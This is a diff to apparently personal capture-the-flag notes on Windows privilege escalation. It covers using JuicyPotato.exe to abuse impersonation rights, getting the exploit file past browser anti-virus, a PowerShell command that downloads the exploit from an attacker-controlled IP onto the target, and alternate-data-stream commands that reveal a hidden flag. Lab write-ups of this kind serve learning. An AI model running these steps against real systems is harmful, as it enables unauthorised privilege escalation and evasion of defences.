@@ -18,7 +18,7 @@ Find out the permissions in using dir command
 
 on finding impersonation enabled for normal user, using JuicyPotato.exe we can exploit this
 
-click "Download" symbol in browser and click extract --> to bypass anti-virus check in browser, else exploit file will be downloaded emptry (0 Bytes)
+click "Download" symbol in browser and click extract --> to bypass anti-virus check in browser, else exploit file will be downloaded empty (0 Bytes)
 
 File transfer => powershell -c  "Invoke-WebRequest -Uri http://10.10.16.90:8081/JuicyPotato.exe -outFile C:\Users\kohsuke\Desktop\JP.exe"
 
@@ -48,7 +48,10 @@ cd to Administrator/Deskop there you'll find hm.txt, which is not root
 
 root is in same Desktop directory but dir command will not display it, there are commands to get files in alternate data streams
 
+try "dir /r" command to load files even with alternate file streams (taken from IPPSEC video)
+
 Use below set of commands to find the files from alternate streams and its contents, standard commands "dir" or "type" will not work here. 
+
 
 
 Find the HIDDEN root.txt exist -->Get-item -Path C:\Users\Administrator\Desktop\hm.txt -stream *
